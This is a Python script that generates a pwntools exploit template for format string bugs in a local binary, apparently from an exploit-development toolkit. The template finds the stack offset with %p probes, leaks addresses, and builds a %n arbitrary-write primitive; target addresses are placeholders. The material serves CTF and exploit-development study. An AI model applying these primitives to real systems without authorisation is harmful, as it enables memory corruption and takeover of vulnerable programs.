#!/usr/bin/env python3
"""
Format String Exploit Template Generator
Generates a format string exploit template using pwntools
"""

import sys
import os

def generate_format_string_exploit(binary_path, output_file):
    """Generate format string exploit template"""
    
    # Note: Using raw string and format() to avoid f-string issues
    template = '''#!/usr/bin/env python3
"""
Format String Exploit for {binary_name}
Generated by pf exploit development tools
"""

from pwn import *

# Set context for the target binary
context.update(
    arch='amd64',
    os='linux',
    log_level='info'
)

# Binary information
binary = ELF('./{binary_name}')

def find_offset():
    """Find the offset to our input on the stack"""
    marker = b'AAAABBBB'
    
    # Try different offsets
    for i in range(1, 20):
        payload = marker + f'%{{i}}$p'.encode()
        
        io = process('./{binary_name}')
        io.sendline(payload)
        output = io.recvall()
        io.close()
        
        if b'4141414142424242' in output or b'0x4141414142424242' in output:
            log.success(f'Found offset: {{i}}')
            return i
    
    log.error('Could not find offset')
    return None

def leak_address(offset):
    """Leak an address from the stack"""
    payload = f'%{{offset}}$p'.encode()
    
    io = process('./{binary_name}')
    io.sendline(payload)
    output = io.recvline()
    io.close()
    
    # Parse the leaked address
    try:
        addr = int(output.strip(), 16)
        log.success(f'Leaked address: {{hex(addr)}}')
        return addr
    except:
        log.error('Failed to parse leaked address')
        return None

def write_primitive(offset, target_addr, value):
    """Write a value to an arbitrary address using %n"""
    # Build payload to write to target_addr
    payload = flat({{
        0: p64(target_addr),
        8: f'%{{value}}c%{{offset}}$n'.encode()
    }})
    
    return payload

def exploit():
    """Main exploit function"""
    
    # Start the process
    io = process('./{binary_name}')
    
    # Step 1: Find offset to controlled input
    log.info('Finding offset to controlled input...')
    offset = find_offset()
    
    if not offset:
        log.error('Could not find offset')
        return
    
    # Step 2: Leak addresses if needed
    log.info('Leaking addresses...')
    # leak_address(offset)
    
    # Step 3: Build write primitive
    # target_addr = 0xdeadbeef  # Replace with actual target
    # value = 0x1337            # Replace with actual value
    # payload = write_primitive(offset, target_addr, value)
    
    # Step 4: Send payload
    payload = b'%x.%x.%x.%x.%x'  # Basic stack leak payload
    io.sendline(payload)
    
    # Get shell interaction
    io.interactive()

if __name__ == '__main__':
    exploit()
'''.format(binary_name=os.path.basename(binary_path))
    
    # Write the exploit to file
    with open(output_file, 'w') as f:
        f.write(template)
    
    # Make it executable
    os.chmod(output_file, 0o755)
    
    print(f"âœ“ Generated format string exploit template: {output_file}")
    print(f"  Binary: {binary_path}")
    print(f"\nNext steps:")
    print(f"  1. Test the binary: pf format-string-test binary={binary_path}")
    print(f"  2. Edit {output_file} to customize the exploit")
    print(f"  3. Run: python3 {output_file}")

def main():
    if len(sys.argv) < 2:
        print("Usage: format_string_template.py <binary> [output_file]")
        print("Example: format_string_template.py vuln_binary fmt_exploit.py")
        sys.exit(1)
    
    binary_path = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else "fmt_exploit.py"
    
    if not os.path.exists(binary_path):
        print(f"Error: Binary not found: {binary_path}")
        sys.exit(1)
    
    generate_format_string_exploit(binary_path, output_file)

if __name__ == '__main__':
    main()
